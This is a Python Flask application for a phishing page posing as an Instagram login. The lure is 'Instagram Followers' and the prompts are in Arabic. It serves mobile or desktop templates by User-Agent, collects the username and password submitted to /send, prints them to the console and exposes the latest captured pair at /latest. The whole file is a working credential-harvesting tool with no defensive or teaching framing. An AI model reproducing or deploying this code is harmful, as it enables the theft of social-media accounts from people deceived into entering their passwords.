from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os

app = Flask(__name__, template_folder="templates")
app.config.update(
    TITLE=os.getenv("APP_TITLE", "Instagram Followers"),
    SUBTITLE=os.getenv("APP_SUBTITLE", "تسجيل الدخول إلى الحساب"),
    BUTTON_TEXT=os.getenv("APP_BUTTON_TEXT", "تسجيل الدخول"),
    BRAND_TEXT=os.getenv("APP_BRAND_TEXT", "IG"),
    THEME_COLOR=os.getenv("APP_THEME_COLOR", "#0b0b0b"),
)

latest_credentials = {
    "email": "",
    "password": "",
    "time": "",
    "source": ""
}


def is_mobile_user_agent(user_agent: str) -> bool:
    user_agent = (user_agent or "").lower()
    return any(term in user_agent for term in ["mobile", "iphone", "ipad", "android", "phone"])


@app.route("/", methods=["GET"])
def index():
    user_agent = request.headers.get("User-Agent", "")
    template_name = "phone.html" if is_mobile_user_agent(user_agent) else "computer.html"
    return render_template(
        template_name,
        latest=latest_credentials,
        app_title=app.config["TITLE"],
        app_subtitle=app.config["SUBTITLE"],
        button_text=app.config["BUTTON_TEXT"],
        brand_text=app.config["BRAND_TEXT"],
        theme_color=app.config["THEME_COLOR"],
    )


@app.route("/send", methods=["POST"])
def send_credentials():
    if request.form:
        username = request.form.get("username", "").strip() or request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
    else:
        data = request.get_json(silent=True) or {}
        username = str(data.get("username", "") or data.get("email", "")).strip()
        password = str(data.get("password", "")).strip()

    if not username or not password:
        return jsonify({"ok": False, "error": "يجب إدخال اسم المستخدم وكلمة المرور"}), 400

    latest_credentials.update({
        "email": username,
        "password": password,
        "time": datetime.now().strftime("%H:%M:%S"),
        "source": "Browser"
    })

    print(f"[بيانات جديدة] {latest_credentials['time']} | {username} | {password}")
    return jsonify({"ok": True, "message": "تم استلام البيانات بنجاح", "latest": latest_credentials})


@app.route("/latest", methods=["GET"])
def get_latest():
    return jsonify(latest_credentials)


@app.route("/health", methods=["GET"])
def health_check():
    return jsonify({"status": "ok", "service": "instagram-followers"})
